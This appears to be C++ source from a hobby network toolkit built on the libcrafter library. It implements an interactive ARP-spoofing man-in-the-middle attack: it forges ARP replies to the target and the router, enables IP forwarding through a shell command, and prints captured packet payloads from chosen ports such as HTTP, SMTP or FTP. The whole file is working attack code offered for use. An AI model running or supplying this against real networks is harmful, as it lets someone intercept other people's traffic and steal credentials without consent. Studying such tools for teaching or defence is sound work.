using namespace std;
using namespace Crafter;

void PacketHandler(Packet *sniff_packet, void *user_data)
{
    RawLayer *raw_data = sniff_packet->GetLayer<RawLayer>();
    if(raw_data)
    {
        cout << "[" << SUCCESS_COLOR << "+" << NORMAL_COLOR << "] Packet found !" << endl;
        string payload = raw_data->GetStringPayload();
        cout << payload << endl;
    }
}

void sniff_connection(const string iface)
{
    const string myIP = GetMyIP(iface), myMAC = GetMyMAC(iface);
    string target_ip = "", target_port = "", target_mac = "", router_mac = "";
    char router_ip[13] = "";
    Sniffer sniff("", iface, PacketHandler);
    unsigned int dot_counter = 0;
    bool valid_address = false, valid_port = false;

    cout << endl << "========== " << MENU_COLOR << "Capture a specific stream of a device" << NORMAL_COLOR << " ==========" << endl << endl;

    cout << "Enter the IP address to sniff (type \"c\" to cancel) :" << endl;
    do
    {
        cout << "> ";
        getline(cin, target_ip);
        if(target_ip == "c" || target_ip == "C") return;
        if(target_ip.empty()) cout << "[" << ERROR_COLOR << "ERROR" << NORMAL_COLOR << "] Please type something" << endl;
        else valid_address = true;
    }while(!valid_address);

    for(unsigned int i = 0; i < target_ip.size(); i++)
    {
        if(target_ip[i] != '.')
            router_ip[i] = target_ip[i];
        else
        {
            router_ip[i] = '.';
            dot_counter++;
            if(dot_counter == 3)
            {
                router_ip[i+1] = '1';
                break;
            }
        }
    }
    target_mac = GetMAC(target_ip, iface);
    if(target_mac.empty())
    {
        cout << endl << "[" << ERROR_COLOR << "ERROR" << NORMAL_COLOR << "] Unable to retrieve MAC target address, valid IP address ?" << endl << endl;
        return;
    }
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] IP router is : " << router_ip << endl;
    router_mac = GetMAC(router_ip, iface);
    if(router_mac.empty())
    {
        cout << endl << "[" << ERROR_COLOR << "ERROR" << NORMAL_COLOR << "] Unable to retrieve MAC router address, valid IP address ?" << endl << endl;
        return;
    }
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] MAC router address is : " << router_mac << endl;
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] MAC target address is : " << target_mac << endl;

    cout << "Enter the port to sniff (examples: 80 for http, 25 for smtp, 21 for ftp) :" << endl;
    do
    {
        cout << "> ";
        getline(cin, target_port);
        if(target_port.empty()) cout << "[" << ERROR_COLOR << "ERROR" << NORMAL_COLOR << "] Please don't leave this field empty -_-'" << endl;
        else valid_port = true;
    }while(!valid_port);
    try
    {
        sniff.SetFilter("port " + target_port + " and not host " + myIP);
    }
    catch(runtime_error)
    {
        cout << endl << "[" << ERROR_COLOR << "ERROR" << NORMAL_COLOR << "] " << "\"" << target_port << "\"" << " is a wrong expression or a non-existent port" << endl << endl;
        return;
    }
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Create falsified ARP replies..." << endl;

    //Man-In-The-Middle entre routeur et cible
    Ethernet ether_header;
    ether_header.SetSourceMAC(myMAC);
    ether_header.SetDestinationMAC(target_mac);
    ARP arp_header;
    arp_header.SetOperation(ARP::Reply);
    arp_header.SetSenderIP(router_ip);
    arp_header.SetSenderMAC(myMAC);
    arp_header.SetTargetIP(target_ip);
    arp_header.SetTargetMAC(target_mac);
    Packet arping_target(ether_header / arp_header);
    ether_header.SetDestinationMAC(router_mac);
    arp_header.SetSenderIP(target_ip);
    arp_header.SetSenderMAC(myMAC);
    arp_header.SetTargetIP(router_ip);
    arp_header.SetTargetMAC(router_mac);
    Packet arping_router(ether_header / arp_header);

    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Set the IP Forwarding..." << endl;
    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Setup a Man-In-The-Middle attack..." << endl;
    for(int i = 0; i < 5; i++)
    {
        arping_router.Send(iface);
        arping_target.Send(iface);
        //cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] ARP packet sent : " << i+1 << endl;
        sleep(1);
    }
    cout << "[" << SUCCESS_COLOR << "+" << NORMAL_COLOR << "] Man-In-The-Middle attack theoretically " << SUCCESS_COLOR << "succedded" << NORMAL_COLOR << " !" << endl;

    sniff.Spawn();

    cout << "Press \"Enter\" to undone" << endl;
    getchar();
    sniff.Cancel();
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");

    //redirection du routeur et de la cible
    ether_header.SetSourceMAC(target_mac);
    ether_header.SetDestinationMAC(router_mac);
    arp_header.SetSenderIP(target_ip);
    arp_header.SetSenderMAC(target_mac);
    arp_header.SetTargetIP(router_ip);
    arp_header.SetTargetMAC(router_mac);
    Packet redirection_router(ether_header / arp_header);
    ether_header.SetSourceMAC(router_mac);
    ether_header.SetDestinationMAC(target_mac);
    arp_header.SetSenderIP(router_ip);
    arp_header.SetSenderMAC(router_mac);
    arp_header.SetTargetIP(target_ip);
    arp_header.SetTargetMAC(target_mac);
    Packet redirection_target(ether_header / arp_header);
    cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Re-arping target and router..." << endl;
    for(int i = 0; i < 5; i++)
    {
        redirection_router.Send(iface);
        redirection_target.Send(iface);
        //cout << "[" << INFO_COLOR << "@" << NORMAL_COLOR << "] Redirection packets sent : " << i+1 << endl;
        sleep(1);
    }
    cout << endl;
}
